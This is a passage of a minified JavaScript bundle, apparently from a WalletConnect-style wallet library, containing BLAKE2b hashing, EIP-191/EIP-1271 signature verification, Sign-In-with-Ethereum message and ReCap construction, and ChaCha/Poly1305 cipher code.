uCe),hCe=Uint8Array.from([0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,14,10,4,8,9,15,13,6,1,12,0,2,11,7,5,3,11,8,12,0,5,2,15,13,10,14,3,6,7,1,9,4,7,9,3,1,13,12,11,14,2,6,5,10,4,0,15,8,9,0,5,7,2,4,10,15,14,1,11,12,6,8,3,13,2,12,6,10,0,11,8,3,4,13,7,5,15,14,1,9,12,5,1,15,14,13,4,10,0,7,6,3,9,2,8,11,13,11,7,14,12,1,3,9,5,0,15,4,8,6,2,10,6,15,14,9,11,3,0,8,12,2,13,7,1,4,10,5,10,2,8,4,7,6,1,5,15,11,9,14,3,12,13,0,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,14,10,4,8,9,15,13,6,1,12,0,2,11,7,5,3,11,8,12,0,5,2,15,13,10,14,3,6,7,1,9,4,7,9,3,1,13,12,11,14,2,6,5,10,4,0,15,8,9,0,5,7,2,4,10,15,14,1,11,12,6,8,3,13,2,12,6,10,0,11,8,3,4,13,7,5,15,14,1,9]),Fi=Uint32Array.from([4089235720,1779033703,2227873595,3144134277,4271175723,1013904242,1595750129,2773480762,2917565137,1359893119,725511199,2600822924,4215389547,528734635,327033209,1541459225]),st=new Uint32Array(32);function Wh(t,e,n,r,i,s){const o=i[s],a=i[s+1];let c=st[2*t],l=st[2*t+1],f=st[2*e],h=st[2*e+1],m=st[2*n],b=st[2*n+1],w=st[2*r],y=st[2*r+1],E=SB(c,f,o);l=TB(E,l,h,a),c=E|0,{Dh:y,Dl:w}={Dh:y^l,Dl:w^c},{Dh:y,Dl:w}={Dh:N6e(y,w),Dl:O6e(y)},{h:b,l:m}=Au(b,m,y,w),{Bh:h,Bl:f}={Bh:h^b,Bl:f^m},{Bh:h,Bl:f}={Bh:ap(h,f,24),Bl:cp(h,f,24)},st[2*t]=c,st[2*t+1]=l,st[2*e]=f,st[2*e+1]=h,st[2*n]=m,st[2*n+1]=b,st[2*r]=w,st[2*r+1]=y}function Gh(t,e,n,r,i,s){const o=i[s],a=i[s+1];let c=st[2*t],l=st[2*t+1],f=st[2*e],h=st[2*e+1],m=st[2*n],b=st[2*n+1],w=st[2*r],y=st[2*r+1],E=SB(c,f,o);l=TB(E,l,h,a),c=E|0,{Dh:y,Dl:w}={Dh:y^l,Dl:w^c},{Dh:y,Dl:w}={Dh:ap(y,w,16),Dl:cp(y,w,16)},{h:b,l:m}=Au(b,m,y,w),{Bh:h,Bl:f}={Bh:h^b,Bl:f^m},{Bh:h,Bl:f}={Bh:W2(h,f,63),Bl:G2(h,f,63)},st[2*t]=c,st[2*t+1]=l,st[2*e]=f,st[2*e+1]=h,st[2*n]=m,st[2*n+1]=b,st[2*r]=w,st[2*r+1]=y}function pCe(t,e={},n,r,i){if(Nf(n),t<0||t>n)throw new Error("outputLen bigger than keyLen");const{key:s,salt:o,personalization:a}=e;if(s!==void 0&&(s.length<1||s.length>n))throw new Error("key length must be undefined or 1.."+n);if(o!==void 0&&o.length!==r)throw new Error("salt must be undefined or "+r);if(a!==void 0&&a.length!==i)throw new Error("personalization must be undefined or "+i)}class mCe extends QI{constructor(e,n){super(),this.finished=!1,this.destroyed=!1,this.length=0,this.pos=0,Nf(e),Nf(n),this.blockLen=e,this.outputLen=n,this.buffer=new Uint8Array(e),this.buffer32=c_(this.buffer)}update(e){Op(this),e=Mu(e),Lu(e);const{blockLen:n,buffer:r,buffer32:i}=this,s=e.length,o=e.byteOffset,a=e.buffer;for(let c=0;c<s;){this.pos===n&&(up(i),this.compress(i,0,!1),up(i),this.pos=0);const l=Math.min(n-this.pos,s-c),f=o+c;if(l===n&&!(f%4)&&c+l<s){const h=new Uint32Array(a,f,Math.floor((s-c)/4));up(h);for(let m=0;c+n<s;m+=i.length,c+=n)this.length+=n,this.compress(h,m,!1);up(h);continue}r.set(e.subarray(c,c+l),this.pos),this.pos+=l,this.length+=l,c+=l}return this}digestInto(e){Op(this),xB(e,this);const{pos:n,buffer32:r}=this;this.finished=!0,Fc(this.buffer.subarray(n)),up(r),this.compress(r,0,!0),up(r);const i=c_(e);this.get().forEach((s,o)=>i[o]=sf(s))}digest(){const{buffer:e,outputLen:n}=this;this.digestInto(e);const r=e.slice(0,n);return this.destroy(),r}_cloneInto(e){const{buffer:n,length:r,finished:i,destroyed:s,outputLen:o,pos:a}=this;return e||(e=new this.constructor({dkLen:o})),e.set(...this.get()),e.buffer.set(n),e.destroyed=s,e.finished=i,e.length=r,e.pos=a,e.outputLen=o,e}clone(){return this._cloneInto()}}class gCe extends mCe{constructor(e={}){const n=e.dkLen===void 0?64:e.dkLen;super(128,n),this.v0l=Fi[0]|0,this.v0h=Fi[1]|0,this.v1l=Fi[2]|0,this.v1h=Fi[3]|0,this.v2l=Fi[4]|0,this.v2h=Fi[5]|0,this.v3l=Fi[6]|0,this.v3h=Fi[7]|0,this.v4l=Fi[8]|0,this.v4h=Fi[9]|0,this.v5l=Fi[10]|0,this.v5h=Fi[11]|0,this.v6l=Fi[12]|0,this.v6h=Fi[13]|0,this.v7l=Fi[14]|0,this.v7h=Fi[15]|0,pCe(n,e,64,16,16);let{key:r,personalization:i,salt:s}=e,o=0;if(r!==void 0&&(r=Mu(r),o=r.length),this.v0l^=this.outputLen|o<<8|65536|1<<24,s!==void 0){s=Mu(s);const a=c_(s);this.v4l^=sf(a[0]),this.v4h^=sf(a[1]),this.v5l^=sf(a[2]),this.v5h^=sf(a[3])}if(i!==void 0){i=Mu(i);const a=c_(i);this.v6l^=sf(a[0]),this.v6h^=sf(a[1]),this.v7l^=sf(a[2]),this.v7h^=sf(a[3])}if(r!==void 0){const a=new Uint8Array(this.blockLen);a.set(r),this.update(a)}}get(){let{v0l:e,v0h:n,v1l:r,v1h:i,v2l:s,v2h:o,v3l:a,v3h:c,v4l:l,v4h:f,v5l:h,v5h:m,v6l:b,v6h:w,v7l:y,v7h:E}=this;return[e,n,r,i,s,o,a,c,l,f,h,m,b,w,y,E]}set(e,n,r,i,s,o,a,c,l,f,h,m,b,w,y,E){this.v0l=e|0,this.v0h=n|0,this.v1l=r|0,this.v1h=i|0,this.v2l=s|0,this.v2h=o|0,this.v3l=a|0,this.v3h=c|0,this.v4l=l|0,this.v4h=f|0,this.v5l=h|0,this.v5h=m|0,this.v6l=b|0,this.v6h=w|0,this.v7l=y|0,this.v7h=E|0}compress(e,n,r){this.get().forEach((c,l)=>st[l]=c),st.set(Fi,16);let{h:i,l:s}=Ose(BigInt(this.length));st[24]=Fi[8]^s,st[25]=Fi[9]^i,r&&(st[28]=~st[28],st[29]=~st[29]);let o=0;const a=hCe;for(let c=0;c<12;c++)Wh(0,4,8,12,e,n+2*a[o++]),Gh(0,4,8,12,e,n+2*a[o++]),Wh(1,5,9,13,e,n+2*a[o++]),Gh(1,5,9,13,e,n+2*a[o++]),Wh(2,6,10,14,e,n+2*a[o++]),Gh(2,6,10,14,e,n+2*a[o++]),Wh(3,7,11,15,e,n+2*a[o++]),Gh(3,7,11,15,e,n+2*a[o++]),Wh(0,5,10,15,e,n+2*a[o++]),Gh(0,5,10,15,e,n+2*a[o++]),Wh(1,6,11,12,e,n+2*a[o++]),Gh(1,6,11,12,e,n+2*a[o++]),Wh(2,7,8,13,e,n+2*a[o++]),Gh(2,7,8,13,e,n+2*a[o++]),Wh(3,4,9,14,e,n+2*a[o++]),Gh(3,4,9,14,e,n+2*a[o++]);this.v0l^=st[0]^st[16],this.v0h^=st[1]^st[17],this.v1l^=st[2]^st[18],this.v1h^=st[3]^st[19],this.v2l^=st[4]^st[20],this.v2h^=st[5]^st[21],this.v3l^=st[6]^st[22],this.v3h^=st[7]^st[23],this.v4l^=st[8]^st[24],this.v4h^=st[9]^st[25],this.v5l^=st[10]^st[26],this.v5h^=st[11]^st[27],this.v6l^=st[12]^st[28],this.v6h^=st[13]^st[29],this.v7l^=st[14]^st[30],this.v7h^=st[15]^st[31],Fc(st)}destroy(){this.destroyed=!0,Fc(this.buffer32),this.set(0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0)}}const yCe=z6e(t=>new gCe(t)),bCe="https://rpc.walletconnect.org/v1";function Vse(t){const e=`Ethereum Signed Message:
${t.length}`,n=new TextEncoder().encode(e+t);return"0x"+Buffer.from(eCe(n)).toString("hex")}async function wCe(t,e,n,r,i,s){switch(n.t){case"eip191":return await vCe(t,e,n.s);case"eip1271":return await ECe(t,e,n.s,r,i,s);default:throw new Error(`verifySignature failed: Attempted to verify CacaoSignature with unknown type: ${n.t}`)}}function vCe(t,e,n){const r=r5e(n);return g5e({payload:Vse(e),signature:r}).toLowerCase()===t.toLowerCase()}async function ECe(t,e,n,r,i,s){const o=_f(r);if(!o.namespace||!o.reference)throw new Error(`isValidEip1271Signature failed: chainId must be in CAIP-2 format, received: ${r}`);try{const a="0x1626ba7e",c="0000000000000000000000000000000000000000000000000000000000000040",l=n.substring(2),f=(l.length/2).toString(16).padStart(64,"0"),h=(e.startsWith("0x")?e:Vse(e)).substring(2),m=a+h+c+f+l,b=await fetch(`${s||bCe}/?chainId=${r}&projectId=${i}`,{headers:{"Content-Type":"application/json"},method:"POST",body:JSON.stringify({id:_Ce(),jsonrpc:"2.0",method:"eth_call",params:[{to:t,data:m},"latest"]})}),{result:w}=await b.json();return w?w.slice(0,a.length).toLowerCase()===a.toLowerCase():!1}catch(a){return console.error("isValidEip1271Signature: ",a),!1}}function _Ce(){return Date.now()+Math.floor(Math.random()*1e3)}function ACe(t){const e=atob(t),n=new Uint8Array(e.length);for(let o=0;o<e.length;o++)n[o]=e.charCodeAt(o);const r=n[0];if(r===0)throw new Error("No signatures found");const i=1+r*64;if(n.length<i)throw new Error("Transaction data too short for claimed signature count");if(n.length<100)throw new Error("Transaction too short");const s=Buffer.from(t,"base64").slice(1,65);return rw.encode(s)}function CCe(t){const e=new Uint8Array(Buffer.from(t,"base64")),n=Array.from("TransactionData::").map(s=>s.charCodeAt(0)),r=new Uint8Array(n.length+e.length);r.set(n),r.set(e,n.length);const i=yCe(r,{dkLen:32});return rw.encode(i)}function Jz(t){const e=new Uint8Array(JI(SCe(t)));return rw.encode(e)}function SCe(t){if(t instanceof Uint8Array)return t;if(Array.isArray(t))return new Uint8Array(t);if(typeof t=="object"&&t!=null&&t.data)return new Uint8Array(Object.values(t.data));if(typeof t=="object"&&t)return new Uint8Array(Object.values(t));throw new Error("getNearUint8ArrayFromBytes: Unexpected result type from bytes array")}function Xz(t){const e=Buffer.from(t,"base64"),n=t3e(e).txn;if(!n)throw new Error("Invalid signed transaction: missing 'txn' field");const r=W5e(n),i=Buffer.from("TX"),s=Buffer.concat([i,Buffer.from(r)]),o=fCe(s);return m5e.encode(o).replace(/=+$/,"")}function g9(t){const e=[];let n=BigInt(t);for(;n>=BigInt(128);)e.push(Number(n&BigInt(127)|BigInt(128))),n>>=BigInt(7);return e.push(Number(n)),Buffer.from(e)}function TCe(t){const e=Buffer.from(t.signed.bodyBytes,"base64"),n=Buffer.from(t.signed.authInfoBytes,"base64"),r=Buffer.from(t.signature.signature,"base64"),i=[];i.push(Buffer.from([10])),i.push(g9(e.length)),i.push(e),i.push(Buffer.from([18])),i.push(g9(n.length)),i.push(n),i.push(Buffer.from([26])),i.push(g9(r.length)),i.push(r);const s=Buffer.concat(i),o=JI(s);return Buffer.from(o).toString("hex").toUpperCase()}function xCe(t){var e,n;const r=[];try{if(typeof t=="string")return r.push(t),r;if(typeof t!="object")return r;t!=null&&t.id&&r.push(t.id);const i=(n=(e=t?.capabilities)==null?void 0:e.caip345)==null?void 0:n.transactionHashes;i&&r.push(...i)}catch(i){console.warn("getWalletSendCallsHashes failed: ",i)}return r}var ICe=Object.defineProperty,RCe=Object.defineProperties,PCe=Object.getOwnPropertyDescriptors,eq=Object.getOwnPropertySymbols,NCe=Object.prototype.hasOwnProperty,OCe=Object.prototype.propertyIsEnumerable,tq=(t,e,n)=>e in t?ICe(t,e,{enumerable:!0,configurable:!0,writable:!0,value:n}):t[e]=n,kCe=(t,e)=>{for(var n in e||(e={}))NCe.call(e,n)&&tq(t,n,e[n]);if(eq)for(var n of eq(e))OCe.call(e,n)&&tq(t,n,e[n]);return t},DCe=(t,e)=>RCe(t,PCe(e));const Wse="did:pkh:",BCe={eip155:"Ethereum",solana:"Solana",bip122:"Bitcoin"},jCe=t=>t?BCe[t]||t:"",XI=t=>t?.split(":"),MCe=t=>{const e=t&&XI(t);if(e)return t.includes(Wse)?e[3]:e[1]},UCe=t=>{const e=t&&XI(t);if(e)return t.includes(Wse)?e[2]:e[0]},a7=t=>{const e=t&&XI(t);if(e)return e[2]+":"+e[3]},Ox=t=>{const e=t&&XI(t);if(e)return e.pop()};async function nq(t){const{cacao:e,projectId:n}=t,{s:r,p:i}=e,s=Gse(i,i.iss),o=Ox(i.iss);return await wCe(o,s,r,a7(i.iss),n)}const Gse=(t,e)=>{const n=UCe(e);if(!n)throw new Error("Invalid issuer: "+e);const r=`${t.domain} wants you to sign in with your ${jCe(n)} account:`,i=Ox(e);if(!t.aud&&!t.uri)throw new Error("Either `aud` or `uri` is required to construct the message");let s=t.statement||void 0;const o=`URI: ${t.aud||t.uri}`,a=`Version: ${t.version}`,c=`Chain ID: ${MCe(e)}`,l=`Nonce: ${t.nonce}`,f=`Issued At: ${t.iat}`,h=t.exp?`Expiration Time: ${t.exp}`:void 0,m=t.nbf?`Not Before: ${t.nbf}`:void 0,b=t.requestId?`Request ID: ${t.requestId}`:void 0,w=t.resources?`Resources:${t.resources.map(E=>`
- ${E}`).join("")}`:void 0,y=VT(t.resources);if(y){const E=u_(y);s=GCe(s,E)}return[r,i,"",s,"",o,a,c,l,f,h,m,b,w].filter(E=>E!=null).join(`
`)};function LCe(t){return Buffer.from(JSON.stringify(t)).toString("base64")}function FCe(t){return JSON.parse(Buffer.from(t,"base64").toString("utf-8"))}function ag(t){if(!t)throw new Error("No recap provided, value is undefined");if(!t.att)throw new Error("No `att` property found");const e=Object.keys(t.att);if(!(e!=null&&e.length))throw new Error("No resources found in `att` property");e.forEach(n=>{const r=t.att[n];if(Array.isArray(r))throw new Error(`Resource must be an object: ${n}`);if(typeof r!="object")throw new Error(`Resource must be an object: ${n}`);if(!Object.keys(r).length)throw new Error(`Resource object is empty: ${n}`);Object.keys(r).forEach(i=>{const s=r[i];if(!Array.isArray(s))throw new Error(`Ability limits ${i} must be an array of objects, found: ${s}`);if(!s.length)throw new Error(`Value of ${i} is empty array, must be an array with objects`);s.forEach(o=>{if(typeof o!="object")throw new Error(`Ability limits (${i}) must be an array of objects, found: ${o}`)})})})}function $Ce(t,e,n,r={}){return n?.sort((i,s)=>i.localeCompare(s)),{att:{[t]:HCe(e,n,r)}}}function HCe(t,e,n={}){e=e?.sort((i,s)=>i.localeCompare(s));const r=e.map(i=>({[`${t}/${i}`]:[n]}));return Object.assign({},...r)}function Kse(t){return ag(t),`urn:recap:${LCe(t).replace(/=/g,"")}`}function u_(t){const e=FCe(t.replace("urn:recap:",""));return ag(e),e}function zCe(t,e,n){const r=$Ce(t,e,n);return Kse(r)}function qCe(t){return t&&t.includes("urn:recap:")}function VCe(t,e){const n=u_(t),r=u_(e),i=WCe(n,r);return Kse(i)}function WCe(t,e){ag(t),ag(e);const n=Object.keys(t.att).concat(Object.keys(e.att)).sort((i,s)=>i.localeCompare(s)),r={att:{}};return n.forEach(i=>{var s,o;Object.keys(((s=t.att)==null?void 0:s[i])||{}).concat(Object.keys(((o=e.att)==null?void 0:o[i])||{})).sort((a,c)=>a.localeCompare(c)).forEach(a=>{var c,l;r.att[i]=DCe(kCe({},r.att[i]),{[a]:((c=t.att[i])==null?void 0:c[a])||((l=e.att[i])==null?void 0:l[a])})})}),r}function GCe(t="",e){ag(e);const n="I further authorize the stated URI to perform the following actions on my behalf: ";if(t.includes(n))return t;const r=[];let i=0;Object.keys(e.att).forEach(a=>{const c=Object.keys(e.att[a]).map(h=>({ability:h.split("/")[0],action:h.split("/")[1]}));c.sort((h,m)=>h.action.localeCompare(m.action));const l={};c.forEach(h=>{l[h.ability]||(l[h.ability]=[]),l[h.ability].push(h.action)});const f=Object.keys(l).map(h=>(i++,`(${i}) '${h}': '${l[h].join("', '")}' for '${a}'.`));r.push(f.join(", ").replace(".,","."))});const s=r.join(" "),o=`${n}${s}`;return`${t?t+" ":""}${o}`}function rq(t){var e;const n=u_(t);ag(n);const r=(e=n.att)==null?void 0:e.eip155;return r?Object.keys(r).map(i=>i.split("/")[1]):[]}function iq(t){const e=u_(t);ag(e);const n=[];return Object.values(e.att).forEach(r=>{Object.values(r).forEach(i=>{var s;(s=i?.[0])!=null&&s.chains&&n.push(i[0].chains)})}),[...new Set(n.flat())]}function VT(t){if(!t)return;const e=t?.[t.length-1];return qCe(e)?e:void 0}function Zse(t){return t instanceof Uint8Array||ArrayBuffer.isView(t)&&t.constructor.name==="Uint8Array"}function c7(t){if(typeof t!="boolean")throw new Error(`boolean expected, not ${t}`)}function y9(t){if(!Number.isSafeInteger(t)||t<0)throw new Error("positive integer expected, got "+t)}function Zo(t,...e){if(!Zse(t))throw new Error("Uint8Array expected");if(e.length>0&&!e.includes(t.length))throw new Error("Uint8Array expected of length "+e+", got length="+t.length)}function sq(t,e=!0){if(t.destroyed)throw new Error("Hash instance has been destroyed");if(e&&t.finished)throw new Error("Hash#digest() has already been called")}function KCe(t,e){Zo(t);const n=e.outputLen;if(t.length<n)throw new Error("digestInto() expects output buffer of length at least "+n)}function bp(t){return new Uint32Array(t.buffer,t.byteOffset,Math.floor(t.byteLength/4))}function S1(...t){for(let e=0;e<t.length;e++)t[e].fill(0)}function ZCe(t){return new DataView(t.buffer,t.byteOffset,t.byteLength)}const YCe=new Uint8Array(new Uint32Array([287454020]).buffer)[0]===68;function QCe(t){if(typeof t!="string")throw new Error("string expected");return new Uint8Array(new TextEncoder().encode(t))}function u7(t){if(typeof t=="string")t=QCe(t);else if(Zse(t))t=l7(t);else throw new Error("Uint8Array expected, got "+typeof t);return t}function JCe(t,e){if(e==null||typeof e!="object")throw new Error("options must be defined");return Object.assign(t,e)}function XCe(t,e){if(t.length!==e.length)return!1;let n=0;for(let r=0;r<t.length;r++)n|=t[r]^e[r];return n===0}const eSe=(t,e)=>{function n(r,...i){if(Zo(r),!YCe)throw new Error("Non little-endian hardware is not yet supported");if(t.nonceLength!==void 0){const l=i[0];if(!l)throw new Error("nonce / iv required");t.varSizeNonce?Zo(l):Zo(l,t.nonceLength)}const s=t.tagLength;s&&i[1]!==void 0&&Zo(i[1]);const o=e(r,...i),a=(l,f)=>{if(f!==void 0){if(l!==2)throw new Error("cipher output not supported");Zo(f)}};let c=!1;return{encrypt(l,f){if(c)throw new Error("cannot encrypt() twice with same key + nonce");return c=!0,Zo(l),a(o.encrypt.length,f),o.encrypt(l,f)},decrypt(l,f){if(Zo(l),s&&l.length<s)throw new Error("invalid ciphertext length: smaller than tagLength="+s);return a(o.decrypt.length,f),o.decrypt(l,f)}}}return Object.assign(n,t),n};function oq(t,e,n=!0){if(e===void 0)return new Uint8Array(t);if(e.length!==t)throw new Error("invalid output length, expected "+t+", got: "+e.length);if(n&&!nSe(e))throw new Error("invalid output, must be aligned");return e}function aq(t,e,n,r){if(typeof t.setBigUint64=="function")return t.setBigUint64(e,n,r);const i=BigInt(32),s=BigInt(4294967295),o=Number(n>>i&s),a=Number(n&s);t.setUint32(e+4,o,r),t.setUint32(e+0,a,r)}function tSe(t,e,n){c7(n);const r=new Uint8Array(16),i=ZCe(r);return aq(i,0,BigInt(e),n),aq(i,8,BigInt(t),n),r}function nSe(t){return t.byteOffset%4===0}function l7(t){return Uint8Array.from(t)}const Yse=t=>Uint8Array.from(t.split("").map(e=>e.charCodeAt(0))),rSe=Yse("expand 16-byte k"),iSe=Yse("expand 32-byte k"),sSe=bp(rSe),oSe=bp(iSe);function Bn(t,e){return t<<e|t>>>32-e}function d7(t){return t.byteOffset%4===0}const q3=64,aSe=16,Qse=2**32-1,cq=new Uint32Array;function cSe(t,e,n,r,i,s,o,a){const c=i.length,l=new Uint8Array(q3),f=bp(l),h=d7(i)&&d7(s),m=h?bp(i):cq,b=h?bp(s):cq;for(let w=0;w<c;o++){if(t(e,n,r,f,o,a),o>=Qse)throw new Error("arx: counter overflow");const y=Math.min(q3,c-w);if(h&&y===q3){const E=w/4;if(w%4!==0)throw new Error("arx: invalid block position");for(let A=0,R;A<aSe;A++)R=E+A,b[R]=m[R]^f[A];w+=q3;continue}for(let E=0,A;E<y;E++)A=w+E,s[A]=i[A]^l[E];w+=y}}function uSe(t,e){const{allowShortKeys:n,extendNonceFn:r,counterLength:i,counterRight:s,rounds:o}=JCe({allowShortKeys:!1,counterLength:8,counterRight:!1,rounds:20},e);if(typeof t!="function")throw new Error("core must be a function");return y9(i),y9(o),c7(s),c7(n),(a,c,l,f,h=0)=>{Zo(a),Zo(c),Zo(l);const m=l.length;if(f===void 0&&(f=new Uint8Array(m)),Zo(f),y9(h),h<0||h>=Qse)throw new Error("arx: counter overflow");if(f.length<m)throw new Error(`arx: output (${f.length}) is shorter than data (${m})`);const b=[];let w=a.length,y,E;if(w===32)b.push(y=l7(a)),E=oSe;else if(w===16&&n)y=new Uint8Array(32),y.set(a),y.set(a,16),E=sSe,b.push(y);else throw new Error(`arx: invalid 32-byte key, got length=${w}`);d7(c)||b.push(c=l7(c));const A=bp(y);if(r){if(c.length!==24)throw new Error("arx: extended nonce must be 24 bytes");r(E,A,bp(c.subarray(0,16)),A),c=c.subarray(16)}const R=16-i;if(R!==c.length)throw new Error(`arx: nonce must be ${R} or 16 bytes`);if(R!==12){const v=new Uint8Array(12);v.set(c,s?0:12-c.length),c=v,b.push(c)}const S=bp(c);return cSe(t,E,A,S,l,f,h,o),S1(...b),f}}const gs=(t,e)=>t[e++]&255|(t[e++]&255)<<8;class lSe{constructor(e){this.blockLen=16,this.outputLen=16,this.buffer=new Uint8Array(16),this.r=new Uint16Array(10),this.h=new Uint16Array(10),this.pad=new Uint16Array(8),this.pos=0,this.finished=!1,e=u7(e),Zo(e,32);const n=gs(e,0),r=gs(e,2),i=gs(e,4),s=gs(e,6),o=gs(e,8),a=gs(e,10),c=gs(e,12),l=gs(e,14);this.r[0]=n&8191,this.r[1]=(n>>>13|r<<3)&8191,this.r[2]=(r>>>10|i<<6)&7939,this.r[3]=(i>>>7|s<<9)&8191,this.r[4]=(s>>>4|o<<12)&255,this.r[5]=o>>>1&8190,this.r[6]=(o>>>14|a<<2)&8191,this.r[7]=(a>>>11|c<<5)&8065,this.r[8]=(c>>>8|l<<8)&8191,this.r[9]=l>>>5&127;for(let f=0;f<8;f++)this.pad[f]=gs(e,16+2*f)}process(e,n,r=!1){const i=r?0:2048,{h:s,r:o}=this,a=o[0],c=o[1],l=o[2],f=o[3],h=o[4],m=o[5],b=o[6],w=o[7],y=o[8],E=o[9],A=gs(e,n+0),R=gs(e,n+2),S=gs(e,n+4),v=gs(e,n+6),k=gs(e,n+8),O=gs(e,n+10),_=gs(e,n+12),I=gs(e,n+14);let T=s[0]+(A&8191),B=s[1]+((A>>>13|R<<3)&8191),U=s[2]+((R>>>10|S<<6)&8191),M=s[3]+((S>>>7|v<<9)&8191),N=s[4]+((v>>>4|k<<12)&8191),q=s[5]+(k>>>1&8191),P=s[6]+((k>>>14|O<<2)&8191),C=s[7]+((O>>>11|_<<5)&8191),j=s[8]+((_>>>8|I<<8)&8191),z=s[9]+(I>>>5|i),$=0,H=$+T*a+B*(5*E)+U*(5*y)+M*(5*w)+N*(5*b);$=H>>>13,H&=8191,H+=q*(5*m)+P*(5*h)+C*(5*f)+j*(5*l)+z*(5*c),$+=H>>>13,H&=8191;let L=$+T*c+B*a+U*(5*E)+M*(5*y)+N*(5*w);$=L>>>13,L&=8191,L+=q*(5*b)+P*(5*m)+C*(5*h)+j*(5*f)+z*(5*l),$+=L>>>13,L&=8191;let V=$+T*l+B*c+U*a+M*(5*E)+N*(5*y);$=V>>>13,V&=8191,V+=q*(5*w)+P*(5*b)+C*(5*m)+j*(5*h)+z*(5*f),$+=V>>>13,V&=8191;let G=$+T*f+B*l+U*c+M*a+N*(5*E);$=G>>>13,G&=8191,G+=q*(5*y)+P*(5*w)+C*(5*b)+j*(5*m)+z*(5*h),$+=G>>>13,G&=8191;let Z=$+T*h+B*f+U*l+M*c+N*a;$=Z>>>13,Z&=8191,Z+=q*(5*E)+P*(5*y)+C*(5*w)+j*(5*b)+z*(5*m),$+=Z>>>13,Z&=8191;let J=$+T*m+B*h+U*f+M*l+N*c;$=J>>>13,J&=8191,J+=q*a+P*(5*E)+C*(5*y)+j*(5*w)+z*(5*b),$+=J>>>13,J&=8191;let ne=$+T*b+B*m+U*h+M*f+N*l;$=ne>>>13,ne&=8191,ne+=q*c+P*a+C*(5*E)+j*(5*y)+z*(5*w),$+=ne>>>13,ne&=8191;let re=$+T*w+B*b+U*m+M*h+N*f;$=re>>>13,re&=8191,re+=q*l+P*c+C*a+j*(5*E)+z*(5*y),$+=re>>>13,re&=8191;let le=$+T*y+B*w+U*b+M*m+N*h;$=le>>>13,le&=8191,le+=q*f+P*l+C*c+j*a+z*(5*E),$+=le>>>13,le&=8191;let oe=$+T*E+B*y+U*w+M*b+N*m;$=oe>>>13,oe&=8191,oe+=q*h+P*f+C*l+j*c+z*a,$+=oe>>>13,oe&=8191,$=($<<2)+$|0,$=$+H|0,H=$&8191,$=$>>>13,L+=$,s[0]=H,s[1]=L,s[2]=V,s[3]=G,s[4]=Z,s[5]=J,s[6]=ne,s[7]=re,s[8]=le,s[9]=oe}finalize(){const{h:e,pad:n}=this,r=new Uint16Array(10);let i=e[1]>>>13;e[1]&=8191;for(let a=2;a<10;a++)e[a]+=i,i=e[a]>>>13,e[a]&=8191;e[0]+=i*5,i=e[0]>>>13,e[0]&=8191,e[1]+=i,i=e[1]>>>13,e[1]&=8191,e[2]+=i,r[0]=e[0]+5,i=r[0]>>>13,r[0]&=8191;for(let a=1;a<10;a++)r[a]=e[a]+i,i=r[a]>>>13,r[a]&=8191;r[9]-=8192;let s=(i^1)-1;for(let a=0;a<10;a++)r[a]&=s;s=~s;for(let a=0;a<10;a++)e[a]=e[a]&s|r[a];e[0]=(e[0]|e[1]<<13)&65535,e[1]=(e[1]>>>3|e[2]<<10)&65535,e[2]=(e[2]>>>6|e[3]<<7)&65535,e[3]=(e[3]>>>9|e[4]<<4)&65535,e[4]=(e[4]>>>12|e[5]<<1|e[6]<<14)&65535,e[5]=(e[6]>>>2|e[7]<<11)&65535,e[6]=(e[7]>>>5|e[8]<<8)&65535,e[7]=(e[8]>>>8|e[9]<<5)&65535;let o=e[0]+n[0];e[0]=o&65535;for(let a=1;a<8;a++)o=(e[a]+n[a]|0)+(o>>>16)|0,e[a]=o&65535;S1(r)}update(e){sq(this),e=u7(e),Zo(e);const{buffer:n,blockLen:r}=this,i=e.length;for(let s=0;s<i;){const o=Math.min(r-this.pos,i-s);if(o===r){for(;r<=i-s;s+=r)this.process(e,s);continue}n.set(e.subarray(s,s+o),this.pos),this.pos+=o,s+=o,this.pos===r&&(this.process(n,0,!1),this.pos=0)}return this}destroy(){S1(this.h,this.r,this.buffer,this.pad)}digestInto(e){sq(this),KCe(e,this),this.finished=!0;const{buffer:n,h:r}=this;let{pos:i}=this;if(i){for(n[i++]=1;i<16;i++)n[i]=0;this.process(n,0,!0)}this.finalize();let s=0;for(let o=0;o<8;o++)e[s++]=r[o]>>>0,e[s++]=r[o]>>>8;return e}digest(){const{buffer:e,outputLen:n}=this;this.digestInto(e);const r=e.slice(0,n);return this.destroy(),r}}function dSe(t){const e=(r,i)=>t(i).update(u7(r)).digest(),n=t(new Uint8Array(32));return e.outputLen=n.outputLen,e.blockLen=n.blockLen,e.create=r=>t(r),e}const fSe=dSe(t=>new lSe(t));function hSe(t,e,n,r,i,s=20){let o=t[0],a=t[1],c=t[2],l=t[3],f=e[0],h=e[1],m=e[2],b=e[3],w=e[4],y=e[5],E=e[6],A=e[7],R=i,S=n[0],v=n[1],k=n[2],O=o,_=a,I=c,T=l,B=f,U=h,M=m,N=b,q=w,P=y,C=E,j=A,z=R,$=S,H=v,L=k;for(let G=0;G<s;G+=2)O=O+B|0,z=Bn(z^O,16),q=q+z|0,B=Bn(B^q,12),O=O+B|0,z=Bn(z^O,8),q=q+z|0,B=Bn(B^q,7),_=_+U|0,$=Bn($^_,16),P=P+$|0,U=Bn(U^P,12),_=_+U|0,$=Bn($^_,8),P=P+$|0,U=Bn(U^P,7),I=I+M|0,H=Bn(H^I,16),C=C+H|0,M=Bn(M^C,12),I=I+M|0,H=Bn(H^I,8),C=C+H|0,M=Bn(M^C,7),T=T+N|0,L=Bn(L^T,16),j=j+L|0,N=Bn(N^j,12),T=T+N|0,L=Bn(L^T,8),j=j+L|0,N=Bn(N^j,7),O=O+U|0,L=Bn(L^O,16),C=C+L|0,U=Bn(U^C,12),O=O+U|0,L=Bn(L^O,8),C=C+L|0,U=Bn(U^C,7),_=_+M|0,z=Bn(z^_,16),j=j+z|0,M=Bn(M^j,12),_=_+M|0,z=Bn(z^_,8),j=j+z|0,M=Bn(M^j,7),I=I+N|0,$=Bn($^I,16),q=q+$|0,N=Bn(N^q,12),I=I+N|0,$=Bn($^I,8),q=q+$|0,N=Bn(N^q,7),T=T+B|0,H=Bn(H^T,16),P=P+H|0,B=Bn(B^P,12),T=T+B|0,H=Bn(H^T,8),P=P+H|0,B=Bn(B^P,7);let 